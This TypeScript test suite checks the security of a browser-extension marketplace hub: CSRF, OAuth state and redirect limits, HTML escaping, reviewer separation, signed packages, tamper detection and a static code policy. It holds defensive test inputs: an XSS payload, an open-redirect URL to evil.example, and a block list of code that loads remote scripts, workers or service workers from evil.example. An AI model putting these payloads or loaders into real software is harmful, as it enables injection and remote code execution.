import { env, exports } from 'cloudflare:workers'
import { applyD1Migrations } from 'cloudflare:test'
import { beforeEach, describe, expect, it, vi } from 'vitest'
import { createVextPackage, sha256Hex, verifyVextPackage, type VextTrustedKey } from '../../src/shared/vext-format.ts'
import { parseSignedReleaseDescriptor, verifySignedReleaseDescriptor } from '../../src/shared/extension-marketplace.ts'
import { verifyHubSignerProof } from '../../src/shared/hub-signer-proof.ts'
import { enforceRateLimit, OAUTH_COOKIE, sha256 } from '../src/security.ts'
import { optionalLegalConfig, PUBLISHER_TERMS_VERSION, publisherTermsText } from '../src/legal.ts'
import signerWorker from '../src/signer.ts'
import { TEST_SIGNING_KEY_ID, TEST_SIGNING_PRIVATE_PKCS8, TEST_SIGNING_PUBLIC_SPKI } from './fixtures/test-signing-key.ts'

const origin = 'https://extensions.vastbrowser.com'
const publisherId = 'publisher_0123456789abcdef'
const reviewerId = 'publisher_fedcba9876543210'
const sessionToken = 'publisher-session-token'
const csrfToken = 'publisher-csrf-token'
const reviewerSessionToken = 'reviewer-session-token'
const reviewerCsrfToken = 'reviewer-csrf-token'
const encoder = new TextEncoder()

async function seedPublisher(id: string, role: 'publisher' | 'reviewer' | 'admin', session: string, csrf: string): Promise<void> {
  const timestamp = new Date().toISOString()
  await env.DB.batch([
    env.DB.prepare('INSERT INTO publishers(id,github_user_id,github_login,display_name,publisher_name,role,verified,created_at,updated_at) VALUES(?1,?2,?3,?4,?5,?6,?7,?8,?8)').bind(id, id === publisherId ? '1001' : '1002', id === publisherId ? 'fixture-publisher' : 'fixture-reviewer', id === publisherId ? 'Fixture Publisher' : 'Fixture Reviewer', id === publisherId ? 'Fixture Publisher' : 'Fixture Reviewer', role, role === 'publisher' ? 0 : 1, timestamp),
    env.DB.prepare('INSERT INTO publisher_sessions(id_hash,publisher_id,csrf_hash,expires_at,created_at) VALUES(?1,?2,?3,?4,?5)').bind(await sha256(session), id, await sha256(csrf), new Date(Date.now() + 60_000).toISOString(), timestamp)
  ])
  await env.DB.prepare('INSERT INTO publisher_terms_acceptances(publisher_id,terms_version,terms_sha256,accepted_at) VALUES(?1,?2,?3,?4)').bind(id, PUBLISHER_TERMS_VERSION, await sha256(publisherTermsText('Fixture Legal Operator')), timestamp).run()
}

function authHeaders(session = sessionToken, csrf = csrfToken): HeadersInit {
  return { origin, cookie: `__Host-vast_hub_session=${session}; __Host-vast_hub_csrf=${csrf}`, 'x-csrf-token': csrf }
}

async function call(path: string, init?: RequestInit): Promise<Response> {
  return exports.default.fetch(new Request(`${origin}${path}`, init))
}

async function createListing(overrides: Record<string, unknown> = {}): Promise<string> {
  const response = await call('/v1/publisher/extensions', { method: 'POST', headers: { ...authHeaders(), 'content-type': 'application/json' }, body: JSON.stringify({ slug: 'test-extension', name: 'Test Extension', summary: 'A strict test extension.', description: 'Review fixture.', category: 'developer', homepage: '', sourceUrl: '', dataPractice: 'local-only', privacyPolicyUrl: '', remoteServices: '', ...overrides }) })
  expect(response.status).toBe(201)
  return String((await response.json() as { id: string }).id)
}

async function fixturePackage(id: string, version = '1.0.0', source = 'globalThis.fixture=true'): Promise<Uint8Array> {
  return createVextPackage({
    extensionId: id,
    version,
    publisherId,
    files: new Map([
      ['background.js', encoder.encode(source)],
      ['content.js', encoder.encode('document.documentElement.dataset.fixtureExtension = "active"')],
      ['manifest.json', encoder.encode(JSON.stringify({ manifest_version: 3, name: 'Test Extension', description: 'Fixture package.', version, content_scripts: [{ matches: ['https://*.example.edu/*'], js: ['content.js'], run_at: 'document_start' }], vast: { api_version: 1, extension_id: id, background: 'background.js', permissions: ['vast.storage'] } }))]
    ])
  })
}

beforeEach(async () => {
  await applyD1Migrations(env.DB, env.TEST_MIGRATIONS)
  await env.DB.batch([
    'extension_report_actions', 'extension_reports', 'submission_reviews', 'submissions', 'extension_screenshots', 'extension_owners', 'download_counters', 'releases', 'extensions', 'publisher_terms_acceptances', 'publisher_sessions', 'oauth_states', 'audit_log', 'publishers'
  ].map((table) => env.DB.prepare(`DELETE FROM ${table}`)))
})

describe('public catalog and security envelope', () => {
  it('returns a fixed deployment-bound proof from the private signer', async () => {
    const response = await signerWorker.fetch(new Request('https://signer.internal/v1/proof'), {
      SIGNING_KEY_ID: TEST_SIGNING_KEY_ID,
      HUB_SIGNING_PRIVATE_KEY_PKCS8: TEST_SIGNING_PRIVATE_PKCS8,
      HUB_ORIGIN: origin
    })
    expect(response.status).toBe(200)
    await verifyHubSignerProof(await response.json(), TEST_SIGNING_KEY_ID, origin, [{ keyId: TEST_SIGNING_KEY_ID, algorithm: 'Ed25519', publicKeySpkiBase64: TEST_SIGNING_PUBLIC_SPKI, status: 'test' }])
  })

  it('accepts the configured operator and rejects placeholders or insecure production contacts', () => {
    expect(optionalLegalConfig(env)).toEqual({ operatorName: 'Fixture Legal Operator', contactUrl: 'https://legal.test/contact' })
    const production = (operatorName: string, contactUrl: string) => ({
      ENVIRONMENT: 'production', HUB_LEGAL_OPERATOR_NAME: operatorName, HUB_LEGAL_CONTACT_URL: contactUrl
    }) as unknown as Env
    expect(optionalLegalConfig(production(' CHANGE_ME ', 'https://vastbrowser.com/legal'))).toBeUndefined()
    expect(optionalLegalConfig(production('Jan Nowacki', 'http://localhost:8787/legal'))).toBeUndefined()
    expect(optionalLegalConfig(production('Jan Nowacki', 'https://example.com/TODO'))).toBeUndefined()
    expect(optionalLegalConfig(production(' Jan Nowacki ', 'https://vastbrowser.com/legal'))).toEqual({ operatorName: 'Jan Nowacki', contactUrl: 'https://vastbrowser.com/legal' })
  })
  it('returns a bounded empty catalog with security headers', async () => {
    const health = await call('/health')
    expect(health.status).toBe(200)
    const healthBody = await health.json() as { ok: boolean; environment: string; signingKeyId: string; signerProof: unknown }
    expect(healthBody).toEqual(expect.objectContaining({ ok: true, environment: 'test', signingKeyId: TEST_SIGNING_KEY_ID }))
    await verifyHubSignerProof(healthBody.signerProof, TEST_SIGNING_KEY_ID, origin, [{ keyId: TEST_SIGNING_KEY_ID, algorithm: 'Ed25519', publicKeySpkiBase64: TEST_SIGNING_PUBLIC_SPKI, status: 'test' }])
    const response = await call('/v1/catalog')
    expect(response.status).toBe(200)
    expect(response.headers.get('content-security-policy')).toContain("default-src 'none'")
    expect(response.headers.get('x-content-type-options')).toBe('nosniff')
    expect(response.headers.get('strict-transport-security')).toBe('max-age=31536000; includeSubDomains')
    expect(response.headers.get('referrer-policy')).toBe('no-referrer')
    expect(response.headers.get('permissions-policy')).toContain('camera=()')
    const body = await response.json() as { items: unknown[]; categories: string[]; pageSize: number }
    expect(body.items).toEqual([])
    expect(body.categories).toContain('developer')
    expect(body.categories).toContain('education')
    expect(body.pageSize).toBe(24)
  })

  it('enforces CSRF and delegates request throttling to a native rate-limit binding', async () => {
    await seedPublisher(publisherId, 'publisher', sessionToken, csrfToken)
    const rejected = await call('/v1/publisher/extensions', { method: 'POST', headers: { origin, cookie: `__Host-vast_hub_session=${sessionToken}`, 'content-type': 'application/json' }, body: '{}' })
    expect(rejected.status).toBe(403)
    const request = new Request(`${origin}/`, { headers: { 'cf-connecting-ip': '203.0.113.9' } })
    let limitedKey = ''
    const limiter: RateLimit = { async limit(options) { limitedKey = options.key; return { success: false } } }
    await expect(enforceRateLimit(request, limiter, 'test-bucket')).rejects.toMatchObject({ status: 429 })
    expect(limitedKey).not.toContain('203.0.113.9')
  })

  it('stores OAuth state only as hashes and constrains the return path', async () => {
    const response = await call('/auth/github/start?return=https%3A%2F%2Fevil.example%2Fsteal', { redirect: 'manual' })
    expect(response.status).toBe(302)
    const redirect = new URL(response.headers.get('location') ?? '')
    expect(redirect.origin).toBe('https://github.com')
    expect(redirect.pathname).toBe('/login/oauth/authorize')
    expect(redirect.searchParams.get('client_id')).toBe('test-github-client')
    expect(redirect.searchParams.get('redirect_uri')).toBe('https://extensions.vastbrowser.com/auth/github/callback')
    const state = redirect.searchParams.get('state') ?? ''
    expect(state.length).toBeGreaterThan(32)
    const oauthSetCookie = response.headers.get('set-cookie') ?? ''
    expect(oauthSetCookie).toContain(`${OAUTH_COOKIE}=`)
    expect(oauthSetCookie).toContain('Path=/;')
    expect(oauthSetCookie).not.toContain('Path=/auth/')
    expect(oauthSetCookie).toContain('Secure')
    expect(oauthSetCookie).toContain('HttpOnly')
    const stored = await env.DB.prepare('SELECT state_hash,return_path FROM oauth_states').first<{ state_hash: string; return_path: string }>()
    expect(stored).toEqual({ state_hash: await sha256(state), return_path: '/dashboard' })
    expect(stored?.state_hash).not.toBe(state)
  })

  it('completes GitHub OAuth without retaining the token and rejects state replay', async () => {
    const start = await call('/auth/github/start?return=%2Fdashboard', { redirect: 'manual' })
    const authorization = new URL(start.headers.get('location') ?? '')
    const state = authorization.searchParams.get('state') ?? ''
    const verifier = new RegExp(`${OAUTH_COOKIE}=([^;]+)`).exec(start.headers.get('set-cookie') ?? '')?.[1] ?? ''
    expect(verifier.length).toBeGreaterThan(32)
    const outbound: string[] = []
    vi.stubGlobal('fetch', async (input: RequestInfo | URL) => {
      const url = input instanceof Request ? input.url : String(input)
      outbound.push(url)
      if (url === 'https://github.com/login/oauth/access_token') return Response.json({ access_token: 'temporary-test-token' })
      if (url === 'https://api.github.com/user') return Response.json({ id: 424242, login: 'fixture-user', name: 'Fixture User', avatar_url: 'https://avatars.githubusercontent.com/u/424242?v=4' })
      throw new Error(`Unexpected outbound test request: ${url}`)
    })
    try {
      const callback = await call(`/auth/github/callback?state=${encodeURIComponent(state)}&code=test-code`, { redirect: 'manual', headers: { cookie: `${OAUTH_COOKIE}=stale-value; ${OAUTH_COOKIE}=${verifier}` } })
      expect(callback.status).toBe(302)
      expect(callback.headers.get('location')).toBe('/dashboard')
      expect(callback.headers.get('set-cookie')).toContain('__Host-vast_hub_session=')
      expect(callback.headers.get('set-cookie')).toContain(`${OAUTH_COOKIE}=; Path=/; Max-Age=0`)
      expect(outbound).toEqual(['https://github.com/login/oauth/access_token', 'https://api.github.com/user'])
      const publisher = await env.DB.prepare('SELECT github_user_id,github_login FROM publishers WHERE github_user_id=?1').bind('424242').first<{ github_user_id: string; github_login: string }>()
      expect(publisher).toEqual({ github_user_id: '424242', github_login: 'fixture-user' })
      const replay = await call(`/auth/github/callback?state=${encodeURIComponent(state)}&code=test-code`, { redirect: 'manual', headers: { cookie: `${OAUTH_COOKIE}=${verifier}` } })
      expect(replay.status).toBe(400)
      expect(outbound).toHaveLength(2)
    } finally {
      vi.unstubAllGlobals()
    }
  })

  it('HTML-escapes publisher-controlled listing content', async () => {
    await seedPublisher(publisherId, 'publisher', sessionToken, csrfToken)
    const payload = '<img src=x onerror=alert(1)>'
    await createListing({ name: payload })
    const response = await call('/dashboard', { headers: { cookie: `__Host-vast_hub_session=${sessionToken}` } })
    expect(response.status).toBe(200)
    const body = await response.text()
    expect(body).toContain('&lt;img src=x onerror=alert(1)&gt;')
    expect(body).not.toContain(payload)
  })

  it('blocks publishing until the current terms are accepted and requires privacy disclosure', async () => {
    await seedPublisher(publisherId, 'publisher', sessionToken, csrfToken)
    await env.DB.prepare('DELETE FROM publisher_terms_acceptances WHERE publisher_id=?1').bind(publisherId).run()
    const payload = { slug: 'terms-test', name: 'Terms test', summary: 'Terms test listing.', description: 'Terms fixture.', category: 'developer', homepage: '', sourceUrl: '', dataPractice: 'external-processing', privacyPolicyUrl: '', remoteServices: 'Example API' }
    const blocked = await call('/v1/publisher/extensions', { method: 'POST', headers: { ...authHeaders(), 'content-type': 'application/json' }, body: JSON.stringify(payload) })
    expect(blocked.status).toBe(428)
    const accepted = await call('/v1/publisher/terms/accept', { method: 'POST', headers: { ...authHeaders(), 'content-type': 'application/json' }, body: JSON.stringify({ accepted: true }) })
    expect(accepted.status).toBe(200)
    const missingPolicy = await call('/v1/publisher/extensions', { method: 'POST', headers: { ...authHeaders(), 'content-type': 'application/json' }, body: JSON.stringify(payload) })
    expect(missingPolicy.status).toBe(400)
    const created = await call('/v1/publisher/extensions', { method: 'POST', headers: { ...authHeaders(), 'content-type': 'application/json' }, body: JSON.stringify({ ...payload, privacyPolicyUrl: 'https://publisher.example.test/privacy' }) })
    expect(created.status).toBe(201)
    const createdId = String((await created.json() as { id: string }).id)
    const acceptance = await env.DB.prepare('SELECT terms_version,terms_sha256,accepted_at FROM publisher_terms_acceptances WHERE publisher_id=?1').bind(publisherId).first<{ terms_version: string; terms_sha256: string; accepted_at: string }>()
    expect(acceptance?.terms_version).toBe(PUBLISHER_TERMS_VERSION)
    expect(acceptance?.terms_sha256).toMatch(/^[a-f0-9]{64}$/)
    expect(acceptance?.accepted_at).toBeTruthy()
    await env.DB.prepare('DELETE FROM publisher_terms_acceptances WHERE publisher_id=?1').bind(publisherId).run()
    const blockedMedia = await call(`/v1/publisher/extensions/${createdId}/media?kind=icon`, { method: 'POST', headers: { ...authHeaders(), 'content-type': 'image/png' }, body: new Uint8Array([1]).buffer })
    expect(blockedMedia.status).toBe(428)
  })

  it('fails publishing closed when verified legal configuration is absent', async () => {
    await seedPublisher(publisherId, 'publisher', sessionToken, csrfToken)
    const originalOperator = env.HUB_LEGAL_OPERATOR_NAME
    const originalContact = env.HUB_LEGAL_CONTACT_URL
    env.HUB_LEGAL_OPERATOR_NAME = ''
    env.HUB_LEGAL_CONTACT_URL = ''
    try {
      const blocked = await call('/v1/publisher/extensions', { method: 'POST', headers: { ...authHeaders(), 'content-type': 'application/json' }, body: JSON.stringify({ slug: 'blocked-legal', name: 'Blocked Legal', summary: 'Legal configuration fixture.', description: 'Legal configuration fixture.', category: 'developer', dataPractice: 'local-only', remoteServices: '' }) })
      expect(blocked.status).toBe(503)
      expect((await blocked.json() as { error: string }).error).toContain('verified platform operator')
      const terms = await call('/legal/publisher-terms')
      expect(await terms.text()).toContain('Publishing is blocked fail-closed.')
    } finally {
      env.HUB_LEGAL_OPERATOR_NAME = originalOperator
      env.HUB_LEGAL_CONTACT_URL = originalContact
    }
  })

  it('lets existing listings replace legacy data-practice state under current terms', async () => {
    await seedPublisher(publisherId, 'publisher', sessionToken, csrfToken)
    const id = await createListing()
    await env.DB.prepare(`UPDATE extensions SET data_practice='undisclosed' WHERE id=?1`).bind(id).run()
    await env.DB.prepare('DELETE FROM publisher_terms_acceptances WHERE publisher_id=?1').bind(publisherId).run()
    const blocked = await call(`/v1/publisher/extensions/${id}/data-practices`, { method: 'POST', headers: { ...authHeaders(), 'content-type': 'application/json' }, body: JSON.stringify({ dataPractice: 'external-processing', privacyPolicyUrl: 'https://publisher.example.test/privacy', remoteServices: 'Example API' }) })
    expect(blocked.status).toBe(428)
    expect((await call('/v1/publisher/terms/accept', { method: 'POST', headers: { ...authHeaders(), 'content-type': 'application/json' }, body: JSON.stringify({ accepted: true }) })).status).toBe(200)
    const missingPolicy = await call(`/v1/publisher/extensions/${id}/data-practices`, { method: 'POST', headers: { ...authHeaders(), 'content-type': 'application/json' }, body: JSON.stringify({ dataPractice: 'external-processing', privacyPolicyUrl: '', remoteServices: 'Example API' }) })
    expect(missingPolicy.status).toBe(400)
    const updated = await call(`/v1/publisher/extensions/${id}/data-practices`, { method: 'POST', headers: { ...authHeaders(), 'content-type': 'application/json' }, body: JSON.stringify({ dataPractice: 'external-processing', privacyPolicyUrl: 'https://publisher.example.test/privacy', remoteServices: 'Example API' }) })
    expect(updated.status).toBe(200)
    expect(await env.DB.prepare('SELECT data_practice,privacy_policy_url,remote_services FROM extensions WHERE id=?1').bind(id).first()).toEqual({ data_practice: 'external-processing', privacy_policy_url: 'https://publisher.example.test/privacy', remote_services: 'Example API' })
    const dashboard = await call('/dashboard', { headers: { cookie: `__Host-vast_hub_session=${sessionToken}` } })
    const dashboardHtml = await dashboard.text()
    expect(dashboardHtml).toContain('listing-data-form')
    expect(dashboardHtml).toContain('Example API')
  })
})

describe('publisher upload and role-aware review', () => {
  it('allows a publisher to reserve the stable ID embedded in an existing package', async () => {
    await seedPublisher(publisherId, 'publisher', sessionToken, csrfToken)
    const stableId = 'kbbfoeemomglhdhohnkcnfnpikedcoka'
    expect(await createListing({ extensionId: stableId })).toBe(stableId)
    const duplicate = await call('/v1/publisher/extensions', { method: 'POST', headers: { ...authHeaders(), 'content-type': 'application/json' }, body: JSON.stringify({ extensionId: stableId, slug: 'another-extension', name: 'Another Extension', summary: 'Another strict extension.', description: 'Review fixture.', category: 'developer', homepage: '', sourceUrl: '', dataPractice: 'local-only', privacyPolicyUrl: '', remoteServices: '' }) })
    expect(duplicate.status).toBe(409)
  })

  it('publishes only after reviewer approval, signs immutable artifacts, and serves them end-to-end', async () => {
    await seedPublisher(publisherId, 'publisher', sessionToken, csrfToken)
    await seedPublisher(reviewerId, 'reviewer', reviewerSessionToken, reviewerCsrfToken)
    const id = await createListing()
    const png = Uint8Array.from(atob('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII='), (character) => character.charCodeAt(0))
    const mediaUpload = await call(`/v1/publisher/extensions/${id}/media?kind=screenshot`, { method: 'POST', headers: { ...authHeaders(), 'content-type': 'image/png' }, body: png.slice().buffer })
    expect(mediaUpload.status).toBe(201)
    const mediaUrl = new URL(String((await mediaUpload.json() as { url: string }).url))
    expect((await call(mediaUrl.pathname)).status).toBe(404)
    const uploadBytes = await fixturePackage(id)
    const upload = await call(`/v1/publisher/extensions/${id}/releases`, { method: 'POST', headers: { ...authHeaders(), 'content-type': 'application/vnd.vast.extension+zip' }, body: uploadBytes.slice().buffer })
    expect(upload.status).toBe(201)
    const release = await upload.json() as { releaseId: string; validation: string[]; permissions: { hosts: string[] } }
    expect(release.validation).toContain('strict-archive')
    expect(release.permissions.hosts).toEqual(['https://*.example.edu/*'])

    const submit = await call(`/v1/publisher/releases/${release.releaseId}/submit`, { method: 'POST', headers: { ...authHeaders(), 'content-type': 'application/json' }, body: JSON.stringify({ warrantyAccepted: true }) })
    expect(submit.status).toBe(200)
    const submissionId = String((await submit.json() as { submissionId: string }).submissionId)
    const beforeApproval = await call(`/v1/install/${id}`)
    expect(beforeApproval.status).toBe(404)

    const reviewPage = await call('/review', { headers: { cookie: `__Host-vast_hub_session=${reviewerSessionToken}` } })
    expect(reviewPage.status).toBe(200)
    const reviewHtml = await reviewPage.text()
    expect(reviewHtml).toContain('A strict test extension.')
    expect(reviewHtml).toContain('Test Extension · hybrid')
    expect(reviewHtml).toContain('Screenshot 1')

    const selfReview = await call(`/v1/review/submissions/${submissionId}`, { method: 'POST', headers: { ...authHeaders(), 'content-type': 'application/json' }, body: JSON.stringify({ action: 'approve', note: '' }) })
    expect(selfReview.status).toBe(403)
    const approval = await call(`/v1/review/submissions/${submissionId}`, { method: 'POST', headers: { ...authHeaders(reviewerSessionToken, reviewerCsrfToken), 'content-type': 'application/json' }, body: JSON.stringify({ action: 'approve', note: 'Reviewed in the local integration test.' }) })
    expect(approval.status).toBe(200)
    const publicMedia = await call(mediaUrl.pathname)
    expect(publicMedia.status).toBe(200)
    expect(publicMedia.headers.get('content-type')).toBe('image/webp')
    expect(publicMedia.headers.get('x-content-type-options')).toBe('nosniff')

    const descriptorResponse = await call(`/v1/install/${id}`)
    expect(descriptorResponse.status).toBe(200)
    const signed = parseSignedReleaseDescriptor(await descriptorResponse.json(), origin)
    const trusted: VextTrustedKey = { keyId: TEST_SIGNING_KEY_ID, algorithm: 'Ed25519', publicKeySpkiBase64: TEST_SIGNING_PUBLIC_SPKI, status: 'test' }
    await verifySignedReleaseDescriptor(signed, [trusted])
    expect(signed.descriptor.extension_id).toBe(id)
    expect(signed.descriptor.publisher_id).toBe(publisherId)

    const packageResponse = await call(new URL(signed.descriptor.package_url).pathname)
    expect(packageResponse.status).toBe(200)
    expect(packageResponse.headers.get('cache-control')).toContain('immutable')
    const official = new Uint8Array(await packageResponse.arrayBuffer())
    const beforeHead = await env.DB.prepare('SELECT count FROM download_counters WHERE extension_id=?1').bind(id).first<{ count: number }>()
    expect((await call(new URL(signed.descriptor.package_url).pathname, { method: 'HEAD' })).status).toBe(200)
    const afterHead = await env.DB.prepare('SELECT count FROM download_counters WHERE extension_id=?1').bind(id).first<{ count: number }>()
    expect(afterHead?.count).toBe(beforeHead?.count)
    const parsed = await verifyVextPackage(official, [trusted], true)
    expect(parsed.metadata.extension_id).toBe(id)
    expect(parsed.metadata.version).toBe('1.0.0')

    const catalog = await call('/v1/catalog')
    expect(catalog.headers.get('cache-control')).toBe('no-store')
    const catalogBody = await catalog.json() as { items: Array<{ id: string; downloads: number }> }
    expect(catalogBody.items).toEqual([expect.objectContaining({ id, downloads: 1 })])
    const publisherHome = await call('/')
    expect(publisherHome.headers.get('cache-control')).toBe('no-store')
    const publisherHtml = await publisherHome.text()
    expect(publisherHtml).toContain('/vast-extensions-for-publishers.png')
    expect(publisherHtml).toContain('https://docs.vastbrowser.com/extensions/extension-development/')
    expect(publisherHtml).toContain('/legal/privacy')
    expect(publisherHtml).toContain('/legal/copyright')
    expect(publisherHtml).not.toContain('Release pipeline')
    expect(publisherHtml).not.toContain('Publishing workflow')
    expect(publisherHtml).not.toContain('Signed in as')
    const explore = await call('/explore')
    expect(explore.headers.get('cache-control')).toBe('no-store')
    const exploreHtml = await explore.text()
    expect(exploreHtml).toContain(id)
    expect(exploreHtml).toContain('Test Extension')
    expect(exploreHtml).toContain('1.0.0')
    const report = await call(`/v1/extensions/${id}/reports`, { method: 'POST', headers: { origin, 'content-type': 'application/json' }, body: JSON.stringify({ category: 'privacy', details: 'The extension appears to contact an undeclared external service.', reporterEmail: 'reporter@example.test' }) })
    expect(report.status).toBe(201)
    const reportId = String((await report.json() as { id: string }).id)
    expect((await env.DB.prepare('SELECT status,category FROM extension_reports WHERE extension_id=?1').bind(id).first<{ status: string; category: string }>())).toEqual({ status: 'open', category: 'privacy' })
    const reportQueue = await call('/review/reports', { headers: { cookie: `__Host-vast_hub_session=${reviewerSessionToken}` } })
    expect(reportQueue.status).toBe(200)
    const reportQueueHtml = await reportQueue.text()
    expect(reportQueueHtml).toContain('The extension appears to contact an undeclared external service.')
    expect(reportQueueHtml).toContain('report-review-form')
    const reportDecision = await call(`/v1/review/reports/${reportId}`, { method: 'POST', headers: { ...authHeaders(reviewerSessionToken, reviewerCsrfToken), 'content-type': 'application/json' }, body: JSON.stringify({ status: 'reviewing', reason: 'The privacy declaration needs manual comparison.', publisherNotified: true, legalHold: true }) })
    expect(reportDecision.status).toBe(200)
    expect(await reportDecision.json()).toEqual({ status: 'reviewing', publisherNotified: true, legalHold: true })
    expect((await env.DB.prepare('SELECT status,legal_hold,publisher_notified_at FROM extension_reports WHERE id=?1').bind(reportId).first<{ status: string; legal_hold: number; publisher_notified_at: string | null }>())).toEqual({ status: 'reviewing', legal_hold: 1, publisher_notified_at: expect.any(String) })
    expect(await env.DB.prepare('SELECT id FROM extension_report_actions WHERE report_id=?1').bind(reportId).first()).toBeTruthy()
    const duplicateBytes = await fixturePackage(id)
    const duplicate = await call(`/v1/publisher/extensions/${id}/releases`, { method: 'POST', headers: { ...authHeaders(), 'content-type': 'application/vnd.vast.extension+zip' }, body: duplicateBytes.slice().buffer })
    expect(duplicate.status).toBe(409)

    const tamperedDescriptor = { ...signed.descriptor, version: '9.9.9' }
    await env.DB.prepare('UPDATE releases SET descriptor_json=?1 WHERE extension_id=?2 AND version=?3').bind(JSON.stringify(tamperedDescriptor), id, '1.0.0').run()
    const databaseTamperResponse = await call(`/v1/install/${id}`)
    const databaseTamper = parseSignedReleaseDescriptor(await databaseTamperResponse.json(), origin)
    await expect(verifySignedReleaseDescriptor(databaseTamper, [trusted])).rejects.toThrow('Could not verify')

    const packagePath = new URL(signed.descriptor.package_url).pathname
    const packageKey = packagePath.slice(1)
    const corrupted = official.slice()
    corrupted[Math.floor(corrupted.byteLength / 2)] ^= 0x80
    await env.PACKAGES.put(packageKey, corrupted)
    const storageTamperResponse = await call(packagePath)
    const storageTamper = new Uint8Array(await storageTamperResponse.arrayBuffer())
    expect(await sha256Hex(storageTamper)).not.toBe(signed.descriptor.sha256)
    await expect(verifyVextPackage(storageTamper, [trusted], true)).rejects.toThrow()
  })

  it('requires a separate reviewer identity even for administrators', async () => {
    await seedPublisher(publisherId, 'admin', sessionToken, csrfToken)
    const id = await createListing({ slug: 'admin-extension', name: 'Admin Extension' })
    const uploadBytes = await fixturePackage(id)
    const upload = await call(`/v1/publisher/extensions/${id}/releases`, { method: 'POST', headers: { ...authHeaders(), 'content-type': 'application/vnd.vast.extension+zip' }, body: uploadBytes.slice().buffer })
    expect(upload.status).toBe(201)
    const release = await upload.json() as { releaseId: string }
    await env.DB.prepare(`UPDATE extensions SET data_practice='undisclosed' WHERE id=?1`).bind(id).run()
    const disclosureBlocked = await call(`/v1/publisher/releases/${release.releaseId}/submit`, { method: 'POST', headers: { ...authHeaders(), 'content-type': 'application/json' }, body: JSON.stringify({ warrantyAccepted: true }) })
    expect(disclosureBlocked.status).toBe(428)
    const disclosure = await call(`/v1/publisher/extensions/${id}/data-practices`, { method: 'POST', headers: { ...authHeaders(), 'content-type': 'application/json' }, body: JSON.stringify({ dataPractice: 'local-only', privacyPolicyUrl: '', remoteServices: '' }) })
    expect(disclosure.status).toBe(200)
    const submit = await call(`/v1/publisher/releases/${release.releaseId}/submit`, { method: 'POST', headers: { ...authHeaders(), 'content-type': 'application/json' }, body: JSON.stringify({ warrantyAccepted: true }) })
    expect(submit.status).toBe(200)
    const submissionId = String((await submit.json() as { submissionId: string }).submissionId)

    const queue = await call('/review', { headers: { cookie: `__Host-vast_hub_session=${sessionToken}` } })
    expect(queue.status).toBe(200)
    const queueHtml = await queue.text()
    expect(queueHtml).toContain('Separate reviewer required')

    const approval = await call(`/v1/review/submissions/${submissionId}`, { method: 'POST', headers: { ...authHeaders(), 'content-type': 'application/json' }, body: JSON.stringify({ action: 'approve', note: '' }) })
    expect(approval.status).toBe(403)
    expect((await call(`/v1/install/${id}`)).status).toBe(404)
  })

  it('enforces ownership, reviewer roles, notes, and static code policy', async () => {
    await seedPublisher(publisherId, 'publisher', sessionToken, csrfToken)
    await seedPublisher(reviewerId, 'reviewer', reviewerSessionToken, reviewerCsrfToken)
    const id = await createListing()
    for (const source of ['eval("remote")', 'new Function("return 1")()', 'window.Function("return 1")()', 'setTimeout("run()", 1)', 'window.setInterval("run()", 1)', 'import("https://evil.example/code.js")', 'new Worker("https://evil.example/worker.js")', 'navigator.serviceWorker.register("https://evil.example/sw.js")', 'WebAssembly.compile(new Uint8Array())', 'const script=document.createElement("script");script.src="https://evil.example/code.js"', 'let script;script=document.createElement("script");script.setAttribute("src","https://evil.example/code.js")']) {
      const forbiddenBytes = await fixturePackage(id, '1.0.0', source)
      const forbidden = await call(`/v1/publisher/extensions/${id}/releases`, { method: 'POST', headers: { ...authHeaders(), 'content-type': 'application/vnd.vast.extension+zip' }, body: forbiddenBytes.slice().buffer })
      expect(forbidden.status, source).toBe(400)
      expect((await forbidden.json() as { error: string }).error).toContain('Static policy')
    }

    const otherBytes = await fixturePackage(id)
    const other = await call(`/v1/publisher/extensions/${id}/releases`, { method: 'POST', headers: { ...authHeaders(reviewerSessionToken, reviewerCsrfToken), 'content-type': 'application/vnd.vast.extension+zip' }, body: otherBytes.slice().buffer })
    expect(other.status).toBe(404)
    const invalidMedia = await call(`/v1/publisher/extensions/${id}/media?kind=icon`, { method: 'POST', headers: { ...authHeaders(), 'content-type': 'image/png' }, body: encoder.encode('not a png').slice().buffer })
    expect(invalidMedia.status).toBe(400)
  })

  it('marks large one-line JavaScript for manual review without hiding the finding', async () => {
    await seedPublisher(publisherId, 'publisher', sessionToken, csrfToken)
    const id = await createListing({ slug: 'manual-review-extension', name: 'Manual Review Extension' })
    const bytes = await fixturePackage(id, '1.0.0', 'globalThis.fixtureValue=1;'.repeat(1_000))
    const response = await call(`/v1/publisher/extensions/${id}/releases`, { method: 'POST', headers: { ...authHeaders(), 'content-type': 'application/vnd.vast.extension+zip' }, body: bytes.slice().buffer })
    expect(response.status).toBe(201)
    const body = await response.json() as { validation: string[] }
    expect(body.validation).toContain('background.js: manual review required for minified or obfuscated source')
  })
})
